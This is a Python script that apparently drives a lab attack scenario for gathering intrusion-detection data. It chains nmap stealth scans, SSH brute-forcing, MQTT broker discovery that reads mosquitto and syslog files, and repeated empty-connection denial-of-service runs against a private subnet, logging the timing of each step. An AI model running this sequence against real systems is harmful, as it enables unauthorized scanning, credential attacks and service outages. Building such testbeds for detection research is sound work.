import pytz
import time
from datetime import datetime
import apts
import pickle
import random
import os


def main():
    iteration = str(int(os.getenv("empty_connection_dos_num_it")) + 1)
    os.putenv("empty_connection_dos_num_it", iteration)
    target = "10.0.20"
    attack_name = "empty_connection_dos"
    experiments_details = []
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) RECONNAISSANCE
    # ----------------------------------------------------------------------------------------------
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.1", command_list, attack_name, "netstat", iteration,
                                     pause_commands=True, sup_conclusion_pause=2)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 180))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 1) RECONNAISSANCE
    # ----------------------------------------------------------------------------------------------
    commands = "sudo nmap -sS -T1 -Pn 192.168.1.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.2", command_list, attack_name, "nmap_t1_192",
                                     iteration, pause_commands=False, sup_conclusion_pause=2)
    experiments_details.append(experiment)
    time.sleep(random.randint(1, 360))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 1) RECONNAISSANCE
    # ----------------------------------------------------------------------------------------------
    commands = "sudo nmap  -sS -T2 -Pn 10.0.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.3", command_list, attack_name, "nmap_t1_10", iteration,
                                     pause_commands=False, sup_conclusion_pause=2)
    experiments_details.append(experiment)
    time.sleep(random.randint(10, 360))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 1) RECONNAISSANCE
    # ----------------------------------------------------------------------------------------------
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.4", command_list, attack_name, "netstat", iteration,
                                     pause_commands=True, sup_conclusion_pause=2)
    experiments_details.append(experiment)
    time.sleep(random.randint(1, 60))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 1) RECONNAISSANCE
    # ----------------------------------------------------------------------------------------------
    commands = "sudo nmap -sS -T1 -Pn 192.168.1.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.5", command_list, attack_name, "nmap_t1_192",
                                     iteration, pause_commands=False, sup_conclusion_pause=2)
    experiments_details.append(experiment)
    time.sleep(random.randint(1, 120))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiment = apts.brute_force("1.6", attack_name, iteration)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 120))

    with open('./output/exp_detail.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiment = apts.brute_force("1.7", attack_name, iteration)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 120))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.8", command_list2, attack_name, "mqtt_cat", iteration,
                                     pause_commands=True, start_pausing=1)
    experiments_details.append(experiment)
    time.sleep(random.randint(20, 60))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo /usr/bin/nmap -sS -T2 -Pn -p 1883,8883 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.9", command_list2, attack_name, "nmap_mqtt", iteration,
                                     pause_commands=False, sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(20, 60))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.10", command_list2, attack_name, "nmap_banner",
                                     iteration, pause_commands=False)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 80))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.11", command_list2, attack_name, "nmap_sub", iteration,
                                     pause_commands=False)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 120))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_dos(target, "2.1", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.2", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.3", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.4", 25, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.5", 30, iteration)
    experiments_details.append(experiment)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_dos(target, "2.6", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.7", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.8", 15, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.9", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.10", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.11", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.12", 15, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.13", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.14", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.15", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.16", 25, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.17", 30, iteration)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.12", command_list2, attack_name, "nmap_banner", iteration,
                                     pause_commands=False)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 80))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.13", command_list2, attack_name, "nmap_banner", iteration,
                                     pause_commands=False)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 80))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.14", command_list2, attack_name, "nmap_banner", iteration,
                                     pause_commands=False)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 80))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo nmap -sS -T3 -f -Pn -p 1883,8883 --script banner 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.15", command_list2, attack_name, "nmap_banner", iteration,
                                     pause_commands=False)
    experiments_details.append(experiment)
    time.sleep(random.randint(6, 80))

    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_dos(target, "2.18", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.19", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.20", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.21", 25, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.22", 30, iteration)
    experiments_details.append(experiment)

    # 3) EMPTY CONNECTION DOS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.empty_connection_dos(target, "2.23", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.24", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.25", 15, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.26", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.27", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.28", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.29", 15, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.30", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.31", 10, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.32", 20, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.33", 25, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.34", 30, iteration)
    experiments_details.append(experiment)
    experiment = apts.empty_connection_dos(target, "2.35", 30, iteration)
    experiments_details.append(experiment)

    print(experiments_details)
    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": attack_name,
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all,
        "iteration": iteration,
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
